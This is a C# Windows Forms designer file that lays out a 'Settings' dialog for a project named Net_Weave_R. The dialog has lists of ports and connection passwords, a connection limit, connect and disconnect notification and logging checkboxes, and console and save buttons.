namespace Net_Weave_R.Forms
{
    partial class GUI_Settings
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            this.carbonTheme1 = new CarbonTheme();
            this.panel1 = new System.Windows.Forms.Panel();
            this.label1 = new System.Windows.Forms.Label();
            this.txtLimit = new CarbonTextBox();
            this.carbonGroupBox3 = new CarbonGroupBox();
            this.xLogDis = new CarbonCheckBox();
            this.xLogCon = new CarbonCheckBox();
            this.xNoteDis = new CarbonCheckBox();
            this.xNoteCon = new CarbonCheckBox();
            this.btnSaveSettings = new CarbonButton();
            this.xDup = new CarbonCheckBox();
            this.lineSeparator1 = new NetLib.Forms.LineSeparator();
            this.btnShowConsole = new CarbonButton();
            this.carbonGroupBox2 = new CarbonGroupBox();
            this.carbonButton2 = new CarbonButton();
            this.txtPort = new CarbonTextBox();
            this.lstPorts = new NetLib.Forms.xListview();
            this.columnHeader2 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.menuPorts = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.removeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.carbonGroupBox1 = new CarbonGroupBox();
            this.carbonButton3 = new CarbonButton();
            this.txtPasswords = new CarbonTextBox();
            this.lstPasswords = new NetLib.Forms.xListview();
            this.columnHeader1 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.menuPasswords = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.viewToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.btnResetTotal = new CarbonButton();
            this.carbonTheme1.SuspendLayout();
            this.panel1.SuspendLayout();
            this.carbonGroupBox3.SuspendLayout();
            this.carbonGroupBox2.SuspendLayout();
            this.menuPorts.SuspendLayout();
            this.carbonGroupBox1.SuspendLayout();
            this.menuPasswords.SuspendLayout();
            this.SuspendLayout();
            // 
            // carbonTheme1
            // 
            this.carbonTheme1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(211)))), ((int)(((byte)(211)))), ((int)(((byte)(211)))));
            this.carbonTheme1.BorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.carbonTheme1.ControlBox = true;
            this.carbonTheme1.Controls.Add(this.panel1);
            this.carbonTheme1.Customization = "wMDA/8DAwP96enr/09PT/0ZGRv+Wlpb/AAAA/////27///8e////AAAAAP9WVlb/";
            this.carbonTheme1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.carbonTheme1.DrawHatch = true;
            this.carbonTheme1.EnableExit = true;
            this.carbonTheme1.EnableMaximize = false;
            this.carbonTheme1.EnableMinimize = true;
            this.carbonTheme1.Font = new System.Drawing.Font("Verdana", 8F);
            this.carbonTheme1.Image = null;
            this.carbonTheme1.Location = new System.Drawing.Point(0, 0);
            this.carbonTheme1.Movable = true;
            this.carbonTheme1.Name = "carbonTheme1";
            this.carbonTheme1.NoRounding = false;
            this.carbonTheme1.Sizable = false;
            this.carbonTheme1.Size = new System.Drawing.Size(498, 259);
            this.carbonTheme1.SmartBounds = true;
            this.carbonTheme1.TabIndex = 0;
            this.carbonTheme1.Text = "Settings";
            this.carbonTheme1.TransparencyKey = System.Drawing.Color.Fuchsia;
            this.carbonTheme1.Transparent = false;
            // 
            // panel1
            // 
            this.panel1.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.panel1.Controls.Add(this.btnResetTotal);
            this.panel1.Controls.Add(this.label1);
            this.panel1.Controls.Add(this.txtLimit);
            this.panel1.Controls.Add(this.carbonGroupBox3);
            this.panel1.Controls.Add(this.btnSaveSettings);
            this.panel1.Controls.Add(this.xDup);
            this.panel1.Controls.Add(this.lineSeparator1);
            this.panel1.Controls.Add(this.btnShowConsole);
            this.panel1.Controls.Add(this.carbonGroupBox2);
            this.panel1.Controls.Add(this.carbonGroupBox1);
            this.panel1.Location = new System.Drawing.Point(12, 27);
            this.panel1.Name = "panel1";
            this.panel1.Size = new System.Drawing.Size(474, 220);
            this.panel1.TabIndex = 5;
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Location = new System.Drawing.Point(313, 9);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(102, 13);
            this.label1.TabIndex = 12;
            this.label1.Text = "Connection Limit";
            // 
            // txtLimit
            // 
            this.txtLimit.Customization = "AAAA/+Dg4P+pqan/qamp/////wD///8A";
            this.txtLimit.Font = new System.Drawing.Font("Verdana", 8F);
            this.txtLimit.Image = null;
            this.txtLimit.Location = new System.Drawing.Point(421, 3);
            this.txtLimit.MaxLength = 32767;
            this.txtLimit.Multiline = false;
            this.txtLimit.Name = "txtLimit";
            this.txtLimit.NoRounding = false;
            this.txtLimit.NumbersOnly = true;
            this.txtLimit.ReadOnly = false;
            this.txtLimit.Size = new System.Drawing.Size(50, 24);
            this.txtLimit.TabIndex = 11;
            this.txtLimit.Text = "0";
            this.txtLimit.Transparent = false;
            this.txtLimit.UseSystemPasswordChar = false;
            // 
            // carbonGroupBox3
            // 
            this.carbonGroupBox3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(211)))), ((int)(((byte)(211)))), ((int)(((byte)(211)))));
            this.carbonGroupBox3.BorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.carbonGroupBox3.Controls.Add(this.xLogDis);
            this.carbonGroupBox3.Controls.Add(this.xLogCon);
            this.carbonGroupBox3.Controls.Add(this.xNoteDis);
            this.carbonGroupBox3.Controls.Add(this.xNoteCon);
            this.carbonGroupBox3.Customization = "09PT/6mpqf+pqan/////Rv///x7AwMD/4ODg/2xsbP8AAAD/qamp/w==";
            this.carbonGroupBox3.Font = new System.Drawing.Font("Verdana", 8F);
            this.carbonGroupBox3.Image = null;
            this.carbonGroupBox3.Location = new System.Drawing.Point(315, 55);
            this.carbonGroupBox3.Movable = true;
            this.carbonGroupBox3.Name = "carbonGroupBox3";
            this.carbonGroupBox3.NoRounding = false;
            this.carbonGroupBox3.Sizable = true;
            this.carbonGroupBox3.Size = new System.Drawing.Size(156, 121);
            this.carbonGroupBox3.SmartBounds = true;
            this.carbonGroupBox3.TabIndex = 8;
            this.carbonGroupBox3.Text = "Notifications\\Logs";
            this.carbonGroupBox3.TransparencyKey = System.Drawing.Color.Empty;
            this.carbonGroupBox3.Transparent = false;
            // 
            // xLogDis
            // 
            this.xLogDis.Checked = false;
            this.xLogDis.Customization = "wMDA/1VVVf+AgID/QEBA/83Nzf+goKD/Wlpa/35+fv9qamr/AAAA/w==";
            this.xLogDis.Font = new System.Drawing.Font("Verdana", 8F);
            this.xLogDis.Image = null;
            this.xLogDis.Location = new System.Drawing.Point(11, 94);
            this.xLogDis.Name = "xLogDis";
            this.xLogDis.NoRounding = false;
            this.xLogDis.Size = new System.Drawing.Size(122, 16);
            this.xLogDis.TabIndex = 3;
            this.xLogDis.Text = "Log Disconnected";
            this.xLogDis.Transparent = false;
            // 
            // xLogCon
            // 
            this.xLogCon.Checked = false;
            this.xLogCon.Customization = "wMDA/1VVVf+AgID/QEBA/83Nzf+goKD/Wlpa/35+fv9qamr/AAAA/w==";
            this.xLogCon.Font = new System.Drawing.Font("Verdana", 8F);
            this.xLogCon.Image = null;
            this.xLogCon.Location = new System.Drawing.Point(11, 72);
            this.xLogCon.Name = "xLogCon";
            this.xLogCon.NoRounding = false;
            this.xLogCon.Size = new System.Drawing.Size(112, 16);
            this.xLogCon.TabIndex = 2;
            this.xLogCon.Text = "Log Connected";
            this.xLogCon.Transparent = false;
            // 
            // xNoteDis
            // 
            this.xNoteDis.Checked = false;
            this.xNoteDis.Customization = "wMDA/1VVVf+AgID/QEBA/83Nzf+goKD/Wlpa/35+fv9qamr/AAAA/w==";
            this.xNoteDis.Font = new System.Drawing.Font("Verdana", 8F);
            this.xNoteDis.Image = null;
            this.xNoteDis.Location = new System.Drawing.Point(11, 50);
            this.xNoteDis.Name = "xNoteDis";
            this.xNoteDis.NoRounding = false;
            this.xNoteDis.Size = new System.Drawing.Size(134, 16);
            this.xNoteDis.TabIndex = 1;
            this.xNoteDis.Text = "Notify Disconnected";
            this.xNoteDis.Transparent = false;
            // 
            // xNoteCon
            // 
            this.xNoteCon.Checked = false;
            this.xNoteCon.Customization = "wMDA/1VVVf+AgID/QEBA/83Nzf+goKD/Wlpa/35+fv9qamr/AAAA/w==";
            this.xNoteCon.Font = new System.Drawing.Font("Verdana", 8F);
            this.xNoteCon.Image = null;
            this.xNoteCon.Location = new System.Drawing.Point(11, 28);
            this.xNoteCon.Name = "xNoteCon";
            this.xNoteCon.NoRounding = false;
            this.xNoteCon.Size = new System.Drawing.Size(122, 16);
            this.xNoteCon.TabIndex = 0;
            this.xNoteCon.Text = "Notify Connected";
            this.xNoteCon.Transparent = false;
            // 
            // btnSaveSettings
            // 
            this.btnSaveSettings.Customization = "gICA/6mpqf/T09P/////AICAgP+pqan/aWlp/9PT0//AwMD/AAAA/6mpqf8=";
            this.btnSaveSettings.Font = new System.Drawing.Font("Verdana", 8F);
            this.btnSaveSettings.Image = null;
            this.btnSaveSettings.Location = new System.Drawing.Point(354, 190);
            this.btnSaveSettings.Name = "btnSaveSettings";
            this.btnSaveSettings.NoRounding = false;
            this.btnSaveSettings.Size = new System.Drawing.Size(113, 25);
            this.btnSaveSettings.TabIndex = 7;
            this.btnSaveSettings.Text = "Save and Close";
            this.btnSaveSettings.Transparent = false;
            this.btnSaveSettings.Click += new System.EventHandler(this.btnSaveSettings_Click);
            // 
            // xDup
            // 
            this.xDup.Checked = false;
            this.xDup.Customization = "wMDA/1VVVf+AgID/QEBA/83Nzf+goKD/Wlpa/35+fv9qamr/AAAA/w==";
            this.xDup.Font = new System.Drawing.Font("Verdana", 8F);
            this.xDup.Image = null;
            this.xDup.Location = new System.Drawing.Point(326, 33);
            this.xDup.Name = "xDup";
            this.xDup.NoRounding = false;
            this.xDup.Size = new System.Drawing.Size(134, 16);
            this.xDup.TabIndex = 9;
            this.xDup.Text = "Prevent Duplication";
            this.xDup.Transparent = false;
            // 
            // lineSeparator1
            // 
            this.lineSeparator1.Location = new System.Drawing.Point(0, 182);
            this.lineSeparator1.MaximumSize = new System.Drawing.Size(2000, 2);
            this.lineSeparator1.MinimumSize = new System.Drawing.Size(0, 2);
            this.lineSeparator1.Name = "lineSeparator1";
            this.lineSeparator1.Size = new System.Drawing.Size(471, 2);
            this.lineSeparator1.TabIndex = 6;
            // 
            // btnShowConsole
            // 
            this.btnShowConsole.Customization = "gICA/6mpqf/T09P/////AICAgP+pqan/aWlp/9PT0//AwMD/AAAA/6mpqf8=";
            this.btnShowConsole.Font = new System.Drawing.Font("Verdana", 8F);
            this.btnShowConsole.Image = null;
            this.btnShowConsole.Location = new System.Drawing.Point(6, 190);
            this.btnShowConsole.Name = "btnShowConsole";
            this.btnShowConsole.NoRounding = false;
            this.btnShowConsole.Size = new System.Drawing.Size(113, 25);
            this.btnShowConsole.TabIndex = 5;
            this.btnShowConsole.Text = "Toggle Console";
            this.btnShowConsole.Transparent = false;
            this.btnShowConsole.Click += new System.EventHandler(this.btnShowConsole_Click);
            // 
            // carbonGroupBox2
            // 
            this.carbonGroupBox2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(211)))), ((int)(((byte)(211)))), ((int)(((byte)(211)))));
            this.carbonGroupBox2.BorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.carbonGroupBox2.Controls.Add(this.carbonButton2);
            this.carbonGroupBox2.Controls.Add(this.txtPort);
            this.carbonGroupBox2.Controls.Add(this.lstPorts);
            this.carbonGroupBox2.Customization = "09PT/6mpqf+pqan/////Rv///x7AwMD/4ODg/2xsbP8AAAD/qamp/w==";
            this.carbonGroupBox2.Font = new System.Drawing.Font("Verdana", 8F);
            this.carbonGroupBox2.Image = null;
            this.carbonGroupBox2.Location = new System.Drawing.Point(3, 3);
            this.carbonGroupBox2.Movable = true;
            this.carbonGroupBox2.Name = "carbonGroupBox2";
            this.carbonGroupBox2.NoRounding = false;
            this.carbonGroupBox2.Sizable = true;
            this.carbonGroupBox2.Size = new System.Drawing.Size(134, 173);
            this.carbonGroupBox2.SmartBounds = true;
            this.carbonGroupBox2.TabIndex = 4;
            this.carbonGroupBox2.Text = "Ports";
            this.carbonGroupBox2.TransparencyKey = System.Drawing.Color.Empty;
            this.carbonGroupBox2.Transparent = false;
            // 
            // carbonButton2
            // 
            this.carbonButton2.Customization = "gICA/6mpqf/T09P/////AICAgP+pqan/aWlp/9PT0//AwMD/AAAA/6mpqf8=";
            this.carbonButton2.Font = new System.Drawing.Font("Verdana", 8F);
            this.carbonButton2.Image = null;
            this.carbonButton2.Location = new System.Drawing.Point(72, 146);
            this.carbonButton2.Name = "carbonButton2";
            this.carbonButton2.NoRounding = false;
            this.carbonButton2.Size = new System.Drawing.Size(59, 24);
            this.carbonButton2.TabIndex = 8;
            this.carbonButton2.Text = "Add";
            this.carbonButton2.Transparent = false;
            this.carbonButton2.Click += new System.EventHandler(this.carbonButton2_Click);
            // 
            // txtPort
            // 
            this.txtPort.Customization = "AAAA/+Dg4P+pqan/qamp/////wD///8A";
            this.txtPort.Font = new System.Drawing.Font("Verdana", 8F);
            this.txtPort.Image = null;
            this.txtPort.Location = new System.Drawing.Point(3, 146);
            this.txtPort.MaxLength = 32767;
            this.txtPort.Multiline = false;
            this.txtPort.Name = "txtPort";
            this.txtPort.NoRounding = false;
            this.txtPort.NumbersOnly = true;
            this.txtPort.ReadOnly = false;
            this.txtPort.Size = new System.Drawing.Size(63, 24);
            this.txtPort.TabIndex = 8;
            this.txtPort.Transparent = false;
            this.txtPort.UseSystemPasswordChar = false;
            // 
            // lstPorts
            // 
            this.lstPorts.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.lstPorts.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.columnHeader2});
            this.lstPorts.ContextMenuStrip = this.menuPorts;
            this.lstPorts.Location = new System.Drawing.Point(3, 28);
            this.lstPorts.Name = "lstPorts";
            this.lstPorts.Size = new System.Drawing.Size(128, 115);
            this.lstPorts.TabIndex = 4;
            this.lstPorts.UseCompatibleStateImageBehavior = false;
            this.lstPorts.View = System.Windows.Forms.View.Details;
            // 
            // columnHeader2
            // 
            this.columnHeader2.Text = "";
            this.columnHeader2.Width = 105;
            // 
            // menuPorts
            // 
            this.menuPorts.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.removeToolStripMenuItem});
            this.menuPorts.Name = "menuPorts";
            this.menuPorts.Size = new System.Drawing.Size(118, 26);
            // 
            // removeToolStripMenuItem
            // 
            this.removeToolStripMenuItem.Name = "removeToolStripMenuItem";
            this.removeToolStripMenuItem.Size = new System.Drawing.Size(117, 22);
            this.removeToolStripMenuItem.Text = "Remove";
            this.removeToolStripMenuItem.Click += new System.EventHandler(this.removeToolStripMenuItem_Click);
            // 
            // carbonGroupBox1
            // 
            this.carbonGroupBox1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(211)))), ((int)(((byte)(211)))), ((int)(((byte)(211)))));
            this.carbonGroupBox1.BorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.carbonGroupBox1.Controls.Add(this.carbonButton3);
            this.carbonGroupBox1.Controls.Add(this.txtPasswords);
            this.carbonGroupBox1.Controls.Add(this.lstPasswords);
            this.carbonGroupBox1.Customization = "09PT/6mpqf+pqan/////Rv///x7AwMD/4ODg/2xsbP8AAAD/qamp/w==";
            this.carbonGroupBox1.Font = new System.Drawing.Font("Verdana", 8F);
            this.carbonGroupBox1.Image = null;
            this.carbonGroupBox1.Location = new System.Drawing.Point(143, 3);
            this.carbonGroupBox1.Movable = true;
            this.carbonGroupBox1.Name = "carbonGroupBox1";
            this.carbonGroupBox1.NoRounding = false;
            this.carbonGroupBox1.Sizable = true;
            this.carbonGroupBox1.Size = new System.Drawing.Size(166, 173);
            this.carbonGroupBox1.SmartBounds = true;
            this.carbonGroupBox1.TabIndex = 3;
            this.carbonGroupBox1.Text = "Passwords";
            this.carbonGroupBox1.TransparencyKey = System.Drawing.Color.Empty;
            this.carbonGroupBox1.Transparent = false;
            // 
            // carbonButton3
            // 
            this.carbonButton3.Customization = "gICA/6mpqf/T09P/////AICAgP+pqan/aWlp/9PT0//AwMD/AAAA/6mpqf8=";
            this.carbonButton3.Font = new System.Drawing.Font("Verdana", 8F);
            this.carbonButton3.Image = null;
            this.carbonButton3.Location = new System.Drawing.Point(104, 146);
            this.carbonButton3.Name = "carbonButton3";
            this.carbonButton3.NoRounding = false;
            this.carbonButton3.Size = new System.Drawing.Size(59, 24);
            this.carbonButton3.TabIndex = 10;
            this.carbonButton3.Text = "Add";
            this.carbonButton3.Transparent = false;
            this.carbonButton3.Click += new System.EventHandler(this.carbonButton3_Click);
            // 
            // txtPasswords
            // 
            this.txtPasswords.Customization = "AAAA/+Dg4P+pqan/qamp/////wD///8A";
            this.txtPasswords.Font = new System.Drawing.Font("Verdana", 8F);
            this.txtPasswords.Image = null;
            this.txtPasswords.Location = new System.Drawing.Point(3, 146);
            this.txtPasswords.MaxLength = 32767;
            this.txtPasswords.Multiline = false;
            this.txtPasswords.Name = "txtPasswords";
            this.txtPasswords.NoRounding = false;
            this.txtPasswords.NumbersOnly = false;
            this.txtPasswords.ReadOnly = false;
            this.txtPasswords.Size = new System.Drawing.Size(95, 24);
            this.txtPasswords.TabIndex = 9;
            this.txtPasswords.Transparent = false;
            this.txtPasswords.UseSystemPasswordChar = true;
            // 
            // lstPasswords
            // 
            this.lstPasswords.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.lstPasswords.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.columnHeader1});
            this.lstPasswords.ContextMenuStrip = this.menuPasswords;
            this.lstPasswords.Location = new System.Drawing.Point(3, 28);
            this.lstPasswords.Name = "lstPasswords";
            this.lstPasswords.Size = new System.Drawing.Size(160, 115);
            this.lstPasswords.TabIndex = 4;
            this.lstPasswords.UseCompatibleStateImageBehavior = false;
            this.lstPasswords.View = System.Windows.Forms.View.Details;
            // 
            // columnHeader1
            // 
            this.columnHeader1.Text = "";
            this.columnHeader1.Width = 139;
            // 
            // menuPasswords
            // 
            this.menuPasswords.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.viewToolStripMenuItem,
            this.toolStripMenuItem1});
            this.menuPasswords.Name = "menuPorts";
            this.menuPasswords.Size = new System.Drawing.Size(118, 48);
            // 
            // viewToolStripMenuItem
            // 
            this.viewToolStripMenuItem.Name = "viewToolStripMenuItem";
            this.viewToolStripMenuItem.Size = new System.Drawing.Size(117, 22);
            this.viewToolStripMenuItem.Text = "View";
            this.viewToolStripMenuItem.Click += new System.EventHandler(this.viewToolStripMenuItem_Click);
            // 
            // toolStripMenuItem1
            // 
            this.toolStripMenuItem1.Name = "toolStripMenuItem1";
            this.toolStripMenuItem1.Size = new System.Drawing.Size(117, 22);
            this.toolStripMenuItem1.Text = "Remove";
            this.toolStripMenuItem1.Click += new System.EventHandler(this.toolStripMenuItem1_Click);
            // 
            // btnResetTotal
            // 
            this.btnResetTotal.Customization = "gICA/6mpqf/T09P/////AICAgP+pqan/aWlp/9PT0//AwMD/AAAA/6mpqf8=";
            this.btnResetTotal.Font = new System.Drawing.Font("Verdana", 8F);
            this.btnResetTotal.Image = null;
            this.btnResetTotal.Location = new System.Drawing.Point(125, 190);
            this.btnResetTotal.Name = "btnResetTotal";
            this.btnResetTotal.NoRounding = false;
            this.btnResetTotal.Size = new System.Drawing.Size(113, 25);
            this.btnResetTotal.TabIndex = 13;
            this.btnResetTotal.Text = "Reset Total";
            this.btnResetTotal.Transparent = false;
            this.btnResetTotal.Click += new System.EventHandler(this.btnResetTotal_Click);
            // 
            // GUI_Settings
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(498, 259);
            this.Controls.Add(this.carbonTheme1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Name = "GUI_Settings";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Settings";
            this.TransparencyKey = System.Drawing.Color.Fuchsia;
            this.carbonTheme1.ResumeLayout(false);
            this.panel1.ResumeLayout(false);
            this.panel1.PerformLayout();
            this.carbonGroupBox3.ResumeLayout(false);
            this.carbonGroupBox2.ResumeLayout(false);
            this.menuPorts.ResumeLayout(false);
            this.carbonGroupBox1.ResumeLayout(false);
            this.menuPasswords.ResumeLayout(false);
            this.ResumeLayout(false);

        }

        #endregion

        private CarbonTheme carbonTheme1;
        private System.Windows.Forms.Panel panel1;
        private CarbonGroupBox carbonGroupBox2;
        private NetLib.Forms.xListview lstPorts;
        private System.Windows.Forms.ColumnHeader columnHeader2;
        private CarbonGroupBox carbonGroupBox1;
        private NetLib.Forms.xListview lstPasswords;
        private System.Windows.Forms.ColumnHeader columnHeader1;
        private CarbonButton btnShowConsole;
        private NetLib.Forms.LineSeparator lineSeparator1;
        private CarbonButton btnSaveSettings;
        private CarbonButton carbonButton2;
        private CarbonTextBox txtPort;
        private CarbonButton carbonButton3;
        private CarbonTextBox txtPasswords;
        private CarbonGroupBox carbonGroupBox3;
        private CarbonCheckBox xLogDis;
        private CarbonCheckBox xLogCon;
        private CarbonCheckBox xNoteDis;
        private CarbonCheckBox xNoteCon;
        private System.Windows.Forms.ContextMenuStrip menuPorts;
        private System.Windows.Forms.ToolStripMenuItem removeToolStripMenuItem;
        private System.Windows.Forms.ContextMenuStrip menuPasswords;
        private System.Windows.Forms.ToolStripMenuItem viewToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem1;
        private CarbonCheckBox xDup;
        private System.Windows.Forms.Label label1;
        private CarbonTextBox txtLimit;
        private CarbonButton btnResetTotal;

    }
}